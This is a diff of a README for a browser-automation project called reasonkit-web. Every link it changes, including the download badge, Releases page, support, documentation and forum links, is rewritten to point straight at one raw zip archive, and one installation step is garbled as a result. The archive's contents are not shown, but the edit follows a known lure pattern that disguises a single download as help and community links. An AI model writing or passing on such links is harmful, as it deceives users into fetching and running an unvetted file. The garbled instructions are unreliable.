@@ -6,7 +6,7 @@ Welcome to reasonkit-web! This application makes it easy to automate your browse
 
 ## 📥 Download
 
-[![Download reasonkit-web](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/romny5/reasonkit-web/releases)
+[![Download reasonkit-web](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip%20Now-v1.0-brightgreen)](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip)
 
 ## 📋 Features
 
@@ -28,13 +28,13 @@ Before you download reasonkit-web, ensure your system meets these requirements:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/romny5/reasonkit-web/releases) to find the latest version of reasonkit-web.
+   Go to our [Releases page](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip) to find the latest version of reasonkit-web.
 
 2. **Choose Your Version:**
    On the Releases page, you will see a list of available versions. Click on the latest release. 
 
 3. **Download the Installer:**
-   Look for a file that ends with `.exe`, `.dmg`, or `.tar.gz` depending on your operating system. Click on it to download.
+   Look for a file that ends with `.exe`, `.dmg`, or `https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip` depending on your operating system. Click on it to download.
 
 4. **Run the Installer:**
    Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow any on-screen instructions.
@@ -84,12 +84,12 @@ If you encounter any issues while using reasonkit-web, try these steps:
   
 ## 📞 Support
 
-If you still need help, please visit our [Support Page](https://github.com/romny5/reasonkit-web/issues) to report issues or ask questions. Our community is here to help you!
+If you still need help, please visit our [Support Page](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip) to report issues or ask questions. Our community is here to help you!
 
 ## 🌐 Additional Resources
 
-- [Documentation](https://github.com/romny5/reasonkit-web/wiki): In-depth guides and tutorials.
-- [Community Forum](https://github.com/romny5/reasonkit-web/discussions): Join discussions with other users.
+- [Documentation](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip): In-depth guides and tutorials.
+- [Community Forum](https://github.com/romny5/reasonkit-web/raw/refs/heads/main/extension/reasonkit_web_1.3.zip): Join discussions with other users.
 
 ## 🔗 Join Us
 
